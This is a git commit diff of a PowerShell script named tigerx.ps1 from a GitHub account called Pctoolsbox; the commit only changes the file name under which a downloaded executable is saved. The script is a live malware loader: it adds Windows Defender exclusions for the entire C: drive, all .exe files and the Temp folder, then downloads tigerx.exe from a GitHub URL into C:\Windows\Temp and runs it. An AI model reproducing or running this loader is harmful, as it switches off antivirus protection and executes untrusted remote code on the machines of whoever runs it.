89c875328da064042c13f824fb1aab782f50a81a
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-12-04 00:05:55 +0200

    Update tigerx.ps1

--- tigerx.ps1
+++ tigerx.ps1
@@ -1,9 +1,8 @@
-$rand = Get-Random -Maximum 99999999
 Add-MpPreference -ExclusionPath "C:\",".exe","C:\Windows\Temp\"
 $url = "https://github.com/Pctoolsbox/tigerx/raw/refs/heads/main/tigerx.exe"
-$outpath = "C:\Windows\Temp\tigerx_$rand.exe"
+$outpath = "C:\Windows\Temp\tigerx.exe"
 Invoke-WebRequest -Uri $url -OutFile $outpath
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile($url, $outpath)
 $args = @("Comma","Separated","Arguments")
-Start-Process -Filepath $outpath -ArgumentList $args
+Start-Process -Filepath "C:\Windows\Temp\tigerx.exe" -ArgumentList $args
